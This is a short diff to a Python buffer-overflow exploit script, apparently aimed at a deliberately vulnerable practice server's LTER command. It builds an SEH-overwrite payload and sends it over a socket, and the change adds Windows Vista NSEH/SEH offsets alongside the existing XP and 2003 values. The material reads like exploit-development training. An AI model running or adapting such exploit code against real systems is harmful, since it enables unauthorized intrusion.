@@ -12,8 +12,8 @@ def make_string(offset):
     prepend = b"LTER /.:/"
     #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" %offset
     #pattern = subprocess.check_output(cmd, shell=True)
-    #NSEH offset is 3495 for Windows XP SP3, change to 3491 for Windows 2k3
-    #SEH offset is 3499 for Windows XP SP 3, change to 3495 for Windows 2k3
+    #NSEH offset is 3495 for Windows XP SP3, change to 3491 for Windows 2k3, change to 3515 for Windows Vista
+    #SEH offset is 3499 for Windows XP SP 3, change to 3495 for Windows 2k3, change to 3519 for Windows Vista
     # pad out the initial buffer because I was too lazy to calculate the exact bytes
     pad = b"\x41"*8 # Change this to 16 for Windows 2k3
     # moves the stack to the location our buffer will be at, properly aligned
@@ -83,7 +83,7 @@ def exploit(crash_string):
     s.send(crash_string)
 
 def main():
-    offset = 3495 # change to 3491 for Windows 2k3
+    offset = 3495 # change to 3491 for Windows 2k3, change to 3515 for Windows Vista
     crash_string = make_string(offset)
     exploit(crash_string)
 
